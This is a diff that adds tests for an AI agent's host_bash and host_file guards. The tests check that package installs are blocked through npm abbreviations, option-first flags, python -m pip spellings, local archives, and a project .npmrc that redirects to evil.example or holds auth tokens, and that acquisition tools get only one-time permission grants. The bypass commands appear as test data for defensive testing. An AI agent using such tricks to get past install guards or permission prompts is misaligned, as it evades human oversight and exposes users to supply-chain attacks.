@@ -123,8 +123,93 @@ test('hostBash refuses a blocked install before spawning, and records both refus
   assert.equal(rows[1].metadata.env, undefined, 'the child env never reaches the ledger');
 });
 
+test('the guard cannot be bypassed by npm aliases/abbreviations, options before the subcommand, python -m pip variants or archive specs', () => {
+  // npm accepts any unambiguous abbreviation and common typos of a command;
+  // only exact subcommand tokens run.
+  for (const cmd of ['npm exe cowsay', 'npm in cowsay', 'npm isntall cowsay', 'npm innit react-app x', 'npm cre vite', 'npm it lodash', 'npm link ../x', 'npm cache add evil', 'npm edit lodash', 'npm install-test lodash']) {
+    assert.equal(guard(cmd).blocked, 'npm_subcommand', cmd);
+  }
+  for (const [cmd, code] of [
+    ['npm -g install typescript', 'npm_option_first'],
+    ['npm --registry=https://evil install lodash', 'npm_option_first'],
+    ['npm --prefix /tmp/x install lodash', 'npm_option_first'],
+    ['pip3 -q install pandas', 'pip_option_first'],
+    ['pip3 --index-url=https://evil install pandas', 'pip_option_first'],
+    ['python3 -m pip --isolated install pandas', 'pip_option_first'],
+  ]) assert.equal(guard(cmd).blocked, code, cmd);
+  assert.equal(guard('npm --version').blocked, null);
+  assert.equal(guard('pip3 -V').blocked, null);
+  // Every `python3 … -m pip` spelling reaches the pip guard.
+  for (const cmd of ['python3 -mpip install git+https://x/y', 'python3 -u -m pip install git+https://x/y', 'python3 -um pip install git+https://x/y', 'python3 -I -m pip install git+https://x/y', 'python3 -X dev -m pip install git+https://x/y', 'python3 -m pip3 install git+https://x/y', 'python3 -m pip.__main__ install git+https://x/y']) {
+    assert.equal(guard(cmd).blocked, 'pip_spec', cmd);
+  }
+  assert.equal(guard('python3 -m pip install pandas').install, true);
+  assert.equal(guard('python3 -c "print(1)"').install, false, 'inline code is not a module run');
+  assert.equal(guard('python3 -m http.server').install, false);
+  // Archive-looking names are LOCAL files to npm and pip (an sdist runs setup.py).
+  for (const [cmd, code] of [
+    ['npm install evil.tgz', 'npm_spec'],
+    ['npm install lodash@1.0.tgz', 'npm_spec'],
+    ['npm install pkg.tar.gz', 'npm_spec'],
+    ['npm install user/repo', 'npm_spec'],
+    ['pip3 install numpy==1.0.tar.gz', 'pip_spec'],
+    ['pip3 install evil-1.0-py3-none-any.whl', 'pip_spec'],
+    ['pip3 install pkg.zip', 'pip_spec'],
+  ]) assert.equal(guard(cmd).blocked, code, cmd);
+});
+
+test('a project .npmrc that redirects the registry or carries credentials blocks npm installs there', async () => {
+  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'sira-npmrc-'));
+  const project = path.join(root, 'repo');
+  const nested = path.join(project, 'packages', 'web');
+  fs.mkdirSync(nested, { recursive: true });
+  assert.equal(hostModule._internal.projectNpmrcRedirect(nested), null, 'no .npmrc → no redirect');
+  fs.writeFileSync(path.join(project, '.npmrc'), 'save-exact=true\nfund=false\n');
+  assert.equal(hostModule._internal.projectNpmrcRedirect(nested), null, 'harmless settings are fine');
+  for (const text of ['registry=https://evil.example/\n', '@acme:registry = https://evil.example/\n', '//registry.npmjs.org/:_authToken=abc\n', '_auth=abc\n']) {
+    fs.writeFileSync(path.join(project, '.npmrc'), `save-exact=true\n${text}`);
+    assert.equal(hostModule._internal.projectNpmrcRedirect(nested), path.join(project, '.npmrc'), text);
+  }
+  const rows = [];
+  const prisma = { auditLog: { create: async ({ data }) => { rows.push(data); return data; } } };
+  const refused = await hostModule.hostBash({ command: 'npm install lodash', directory: nested }, { prisma, userId: 'u1', chatId: 'c1' });
+  // The OS tmp dir is one of host_bash's workspace roots, so this reaches the
+  // .npmrc check and is refused there, before spawning npm.
+  assert.equal(refused.code, 'package_install_blocked');
+  assert.equal(refused.blocked, 'npm_project_registry');
+  assert.match(refused.error, /\.npmrc del proyecto/);
+  await new Promise((resolve) => setImmediate(resolve));
+  assert.equal(rows.at(-1).metadata.blocked, 'npm_project_registry');
+});
+
+test('host_file never writes package-manager config that could redirect installs', () => {
+  const hostFile = require('../src/services/agents/host-file-tool');
+  for (const name of ['.npmrc', '.yarnrc', '.yarnrc.yml', 'pip.conf', 'pip.ini', '.pypirc']) {
+    assert.equal(hostFile._internal.isBlockedSecretPath(path.join(os.tmpdir(), 'repo', name)), true, name);
+  }
+  assert.equal(hostFile._internal.isBlockedSecretPath(path.join(os.tmpdir(), 'repo', 'package.json')), false);
+});
+
+test('answering «always allow in this chat» on an acquisition tool reports and applies a one-time allow', async () => {
+  permissionManager.resetForTests();
+  const ask = (toolName) => {
+    let id = null;
+    const pending = permissionManager.requestPermission({ chatId: 'chat-2', userId: 'u1', toolName, onRequest: (r) => { id = r.permissionId; } });
+    return { pending, id: () => id };
+  };
+  const host = ask('host_bash');
+  const answer = permissionManager.resolvePermission({ permissionId: host.id(), decision: 'always_allow_in_chat', userId: 'u1' });
+  assert.deepEqual(answer, { ok: true, decision: 'allow', scope: 'once' });
+  assert.deepEqual(await host.pending, { decision: 'allow', scope: 'once' });
+  assert.equal(permissionManager.isAlwaysAllowed('chat-2', 'host_bash'), false);
+  const web = ask('web_fetch');
+  assert.deepEqual(permissionManager.resolvePermission({ permissionId: web.id(), decision: 'always_allow_in_chat', userId: 'u1' }), { ok: true, decision: 'always_allow_in_chat', scope: 'chat' });
+  assert.equal((await web.pending).scope, 'chat');
+  permissionManager.resetForTests();
+});
+
 test('acquisition tools never get a chat-wide always-allow grant', () => {
-  permissionManager._resetForTests?.();
+  permissionManager.resetForTests();
   for (const tool of ['host_bash', 'clone_project', 'install_skill', 'save_skill', 'install_sandbox_package']) {
     assert.equal(permissionManager.isAcquisitionTool(tool), true, tool);
     permissionManager.allowAlwaysInChat('chat-1', tool);
